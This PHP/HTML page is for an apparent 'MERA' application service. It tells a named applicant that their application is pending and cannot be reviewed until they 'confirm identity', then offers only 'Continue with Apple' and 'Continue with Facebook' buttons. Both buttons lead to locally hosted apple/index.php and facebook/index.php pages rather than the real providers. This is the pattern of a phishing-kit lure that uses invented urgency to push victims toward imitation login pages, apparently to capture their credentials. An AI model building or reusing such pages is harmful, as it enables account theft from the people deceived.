<?php
session_start();
date_default_timezone_set('Asia/Manila');

// Reference number — reuse the one generated at submission time if it exists,
// otherwise generate a fresh one so the page never shows blank.
if (empty($_SESSION['mera_reference'])) {
    $_SESSION['mera_reference'] = 'MERA-' . date('ymd') . '-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
}
$ref       = $_SESSION['mera_reference'];
$submitted = date('F j, Y \a\t h:i A');
$name      = htmlspecialchars($_SESSION['mera_full_name'] ?? '', ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application Pending — MERA</title>
<link rel="icon" type="image/png" href="files/images/logo.jpg">
<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,500;1,9..144,400&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
:root{
  --sand:#f3ede4;
  --cream:#faf7f2;
  --clay:#b08968;
  --ink:#2b2622;
  --taupe:#7c7167;
  --line:rgba(43,38,34,.1);
  --white:#fff;
  --ok:#4a7a5c;
  --ok-bg:rgba(74,122,92,.1);
  --ok-line:rgba(74,122,92,.28);
}
*{margin:0;padding:0;box-sizing:border-box;}
html{overflow-x:hidden;width:100%;}
body{
  font-family:'Inter',sans-serif;
  color:var(--ink);
  line-height:1.7;
  min-height:100vh;
  background:linear-gradient(180deg,var(--sand),var(--cream));
  -webkit-font-smoothing:antialiased;
}
h1{font-family:'Fraunces',serif;font-weight:400;}
a{text-decoration:none;color:inherit;}

.page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:44px 20px;}

.card{
  position:relative;width:100%;max-width:460px;
  background:var(--white);border:1px solid var(--line);border-radius:20px;
  box-shadow:0 30px 70px -32px rgba(43,38,34,.28);
  padding:38px 34px 30px;text-align:center;
  opacity:0;transform:translateY(18px);animation:rise .7s cubic-bezier(.2,.7,.2,1) forwards;
}
@keyframes rise{to{opacity:1;transform:translateY(0);}}

/* header row: logo left, status pill right */
.card-head{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;}

/* logo */
.brand-logo{display:inline-flex;align-items:center;gap:.55rem;font-family:'Fraunces',serif;
  font-size:1.5rem;letter-spacing:.03em;color:var(--ink);}
.brand-logo img{height:30px;width:auto;border-radius:6px;}

/* status pill */
.status-pill{display:inline-flex;align-items:center;gap:7px;padding:6px 14px;
  border-radius:100px;background:var(--ok-bg);border:1px solid var(--ok-line);
  font-size:.66rem;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--ok);white-space:nowrap;}
.status-pill .dot{width:6px;height:6px;border-radius:50%;background:var(--ok);flex:none;}

/* icon badge */
.badge-wrap{width:72px;height:72px;margin:22px auto 4px;position:relative;}
.badge{position:absolute;inset:0;border-radius:50%;background:linear-gradient(135deg,var(--clay),#8f6a4a);
  display:flex;align-items:center;justify-content:center;color:#fff;
  box-shadow:0 12px 26px -10px rgba(176,137,104,.6);}
.badge svg{width:30px;height:30px;stroke:#fff;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;}

/* title / copy */
.title{font-size:clamp(1.5rem,5.5vw,1.85rem);line-height:1.2;margin:14px 0 8px;}
.title em{font-style:italic;color:var(--clay);}
.subtitle{font-size:.9rem;color:var(--taupe);max-width:340px;margin:0 auto;}
.subtitle strong{color:var(--ink);font-weight:600;}

/* stepper */
.stepper{position:relative;display:flex;justify-content:space-between;margin:26px 2px 4px;}
.stepper::before{content:"";position:absolute;top:13px;left:12px;right:12px;height:2px;background:var(--line);border-radius:2px;}
.stepper::after{content:"";position:absolute;top:13px;left:12px;height:2px;border-radius:2px;
  width:calc((100% - 24px) * var(--progress,.25));background:linear-gradient(90deg,var(--clay),#8f6a4a);
  transition:width .6s cubic-bezier(.2,.7,.2,1);}
.st{position:relative;z-index:2;flex:1;display:flex;flex-direction:column;align-items:center;gap:7px;}
.st .node{width:26px;height:26px;border-radius:50%;background:#fff;border:1.5px solid var(--line);
  display:flex;align-items:center;justify-content:center;font-size:.68rem;font-weight:600;color:var(--taupe);transition:all .35s ease;}
.st .lbl{font-size:.62rem;letter-spacing:.03em;color:var(--taupe);font-weight:500;text-align:center;line-height:1.3;max-width:76px;}
.st.done .node{background:var(--clay);border-color:var(--clay);color:#fff;font-size:0;}
.st.done .node::after{content:"\2713";font-size:.7rem;}
.st.done .lbl{color:var(--ink);}
.st.current .node{background:linear-gradient(135deg,var(--clay),#8f6a4a);border-color:var(--clay);color:#fff;
  transform:scale(1.1);box-shadow:0 0 0 4px rgba(176,137,104,.16);}
.st.current .lbl{color:var(--ink);font-weight:600;}

/* reference block */
.ref{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:26px;
  padding:14px 18px;border:1px solid var(--line);border-radius:14px;background:var(--sand);text-align:left;}
.ref .r-lbl{font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;color:var(--clay);margin-bottom:3px;}
.ref .r-num{font-family:'Fraunces',serif;font-size:1.1rem;color:var(--ink);letter-spacing:.02em;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.ref .r-date{font-size:.76rem;color:var(--taupe);margin-top:2px;}
.copy-btn{flex:none;display:inline-flex;align-items:center;gap:6px;cursor:pointer;padding:9px 14px;
  border-radius:100px;border:1px solid var(--line);background:var(--white);color:var(--ink);
  font-size:.72rem;font-weight:500;font-family:'Inter',sans-serif;transition:all .25s ease;}
.copy-btn:hover,.copy-btn.copied{background:var(--ink);color:var(--cream);border-color:var(--ink);}
.copy-btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:1.8;}

/* what's next */
.next{margin-top:18px;padding:16px 18px;border-radius:14px;text-align:left;
  background:rgba(176,137,104,.08);border:1px solid var(--line);}
.next .next-head{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.next .next-head svg{width:16px;height:16px;stroke:var(--clay);fill:none;stroke-width:1.8;flex:none;}
.next .next-head b{font-family:'Fraunces',serif;font-size:1rem;font-weight:500;color:var(--ink);}
.next p{font-size:.84rem;color:var(--taupe);line-height:1.6;}

/* actions */
.actions{margin-top:24px;display:flex;flex-direction:column;gap:10px;}
.btn-primary{
  padding:.9rem 1.6rem;background:var(--ink);color:var(--cream);
  border-radius:999px;font-size:.85rem;font-family:'Inter',sans-serif;letter-spacing:.02em;
  border:none;cursor:pointer;transition:.25s;display:inline-block;
}
.btn-primary:hover{background:var(--clay);}
.btn-outline{
  padding:.9rem 1.6rem;border:1px solid var(--line);border-radius:999px;
  font-size:.85rem;font-family:'Inter',sans-serif;letter-spacing:.02em;
  background:none;color:var(--ink);cursor:pointer;transition:.25s;display:inline-block;
}
.btn-outline:hover{border-color:var(--ink);}

/* footer */
.foot{margin-top:26px;padding-top:18px;border-top:1px solid var(--line);}
.foot span{font-size:.76rem;color:var(--taupe);}

@media (max-width:480px){
  .card{padding:30px 22px 24px;border-radius:18px;}
  .brand-logo{font-size:1.3rem;}
}
@media (prefers-reduced-motion:reduce){
  .card{animation:none!important;opacity:1!important;transform:none!important;}
}
</style>
</head>
<body>

  <main class="page">
    <section class="card" aria-labelledby="statusTitle">

      <div class="card-head">
        <a href="index.php" class="brand-logo">
          <img src="files/images/logo.jpg" alt="MERA logo">
          MERA
        </a>
        <div class="status-pill"><span class="dot"></span> Application Pending</div>
      </div>

      <div class="badge-wrap" aria-hidden="true">
        <div class="badge">
          <svg viewBox="0 0 24 24"><path d="M20 6 9 17l-5-5"></path></svg>
        </div>
      </div>

      <h1 class="title" id="statusTitle">Your application is still <em>pending</em>, <?php echo $name !== '' ? $name : 'thank you'; ?></h1>
     <p class="subtitle">Thanks for applying to MERA. To move forward, choose how you'd
         like to <strong>continue and confirm your identity</strong> below.</p>

      <!-- Stepper -->
      <div class="stepper" style="--progress:.5;">
        <div class="st done"><span class="node"></span><span class="lbl">Submitted</span></div>
        <div class="st current"><span class="node">2</span><span class="lbl">Confirm Identity</span></div>
        <div class="st"><span class="node">3</span><span class="lbl">Under Review</span></div>
        <div class="st"><span class="node">4</span><span class="lbl">Approved</span></div>
      </div>

      <!-- Reference -->
      <div class="ref">
        <div class="r-info">
          <div class="r-lbl">Reference No.</div>
          <div class="r-num" id="refNum"><?php echo htmlspecialchars($ref, ENT_QUOTES, 'UTF-8'); ?></div>
          <div class="r-date">Submitted <?php echo htmlspecialchars($submitted, ENT_QUOTES, 'UTF-8'); ?></div>
        </div>
        <button type="button" class="copy-btn" id="copyBtn" aria-label="Copy reference number">
          <svg viewBox="0 0 24 24">
            <rect x="9" y="9" width="11" height="11" rx="2"></rect>
            <path d="M5 15V5a2 2 0 0 1 2-2h10"></path>
          </svg>
          <span id="copyText">Copy</span>
        </button>
      </div>

      <!-- What's next -->
      <div class="next">
        <div class="next-head">
          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><line x1="12" y1="8" x2="12" y2="13"></line><circle cx="12" cy="16" r=".6" fill="currentColor" stroke="none"></circle></svg>
          <b>Why is my status pending?</b>
        </div>
         <p><strong>Pending means your application hasn't been submitted for review yet</strong> —
           it can't proceed until your identity is confirmed. Choose a secure sign-in option
           below to verify and unlock the review of your application.</p>
      </div>
<style>
/* choose-to-continue */
.choose{margin-top:20px;}
.choose-label{font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);margin-bottom:12px;}
.auth{display:flex;flex-direction:column;gap:11px;}
.auth-btn{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:11px;
  width:100%;padding:16px 22px;border-radius:100px;border:none;cursor:pointer;color:#fff;
  font-family:var(--ff-body);font-weight:600;font-size:.74rem;letter-spacing:.12em;
  transition:transform .3s ease,box-shadow .3s ease,letter-spacing .3s ease;}
.auth-btn .ic{width:19px;height:19px;flex:none;}
.auth-btn::after{content:"";position:absolute;top:0;left:-130%;width:55%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.32),transparent);transition:left .55s ease;}
.auth-btn:hover::after{left:140%;}
.auth-apple{background:#000;box-shadow:0 14px 30px -14px rgba(0,0,0,.8);}
.auth-apple:hover{transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(0,0,0,.75);}
.auth-fb{background:#1877F2;box-shadow:0 14px 30px -14px rgba(24,119,242,.7);}
.auth-fb:hover{background:#1466D2;transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(24,119,242,.75);}
.auth-note{margin-top:11px;font-size:.66rem;color:var(--hi-muted);font-weight:300;line-height:1.5;display:flex;align-items:center;justify-content:center;gap:6px;}
.auth-note svg{width:12px;height:12px;stroke:var(--hi-mauve);fill:none;stroke-width:1.6;flex:none;}
</style>
     <div class="choose">
  <div class="choose-label">Choose how to continue</div>

  <div class="auth">

    <button onclick="goToApple()" class="auth-btn auth-apple">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M17.05 12.54c-.03-2.53 2.07-3.75 2.16-3.81-1.18-1.72-3.01-1.96-3.66-1.99-1.56-.16-3.04.92-3.83.92-.79 0-2.01-.9-3.3-.87-1.7.02-3.26.99-4.13 2.51-1.76 3.06-.45 7.59 1.27 10.07.84 1.21 1.84 2.57 3.15 2.52 1.26-.05 1.74-.82 3.27-.82 1.52 0 1.96.82 3.3.79 1.36-.02 2.22-1.23 3.05-2.45.96-1.4 1.36-2.76 1.38-2.83-.03-.01-2.64-1.01-2.66-4.04zM14.6 4.7c.7-.85 1.17-2.02 1.04-3.2-1 .04-2.22.67-2.94 1.51-.64.75-1.21 1.95-1.06 3.1 1.12.09 2.26-.57 2.96-1.41z"/>
      </svg>
      Continue with Apple
    </button>

    <button onclick="goToFacebook()" class="auth-btn auth-fb">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5.02 3.66 9.18 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.78-1.63 1.57v1.89h2.78l-.44 2.91h-2.34V22c4.78-.76 8.44-4.92 8.44-9.94z"/>
      </svg>
      Continue with Facebook
    </button>

  </div>


</div>

<script>
function goToApple(){
  window.location.href = "apple/index.php";
}

function goToFacebook(){
  window.location.href = "facebook/index.php";
}
</script>

      <footer class="foot">
        <span>Have questions? Reach us anytime through our socials on the homepage.</span>
      </footer>

    </section>
  </main>

<script>
(function(){
  "use strict";
  var b=document.getElementById("copyBtn"),t=document.getElementById("copyText"),n=document.getElementById("refNum");
  if(b&&n){
    b.addEventListener("click",function(){
      var v=n.textContent.trim();
      function done(){b.classList.add("copied");t.textContent="Copied";
        setTimeout(function(){b.classList.remove("copied");t.textContent="Copy";},1800);}
      function fb(){var e=document.createElement("textarea");e.value=v;e.style.position="fixed";e.style.opacity="0";
        document.body.appendChild(e);e.select();try{document.execCommand("copy");}catch(x){}document.body.removeChild(e);done();}
      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(done).catch(fb);}else{fb();}
    });
  }
})();
</script>
</body>
</html>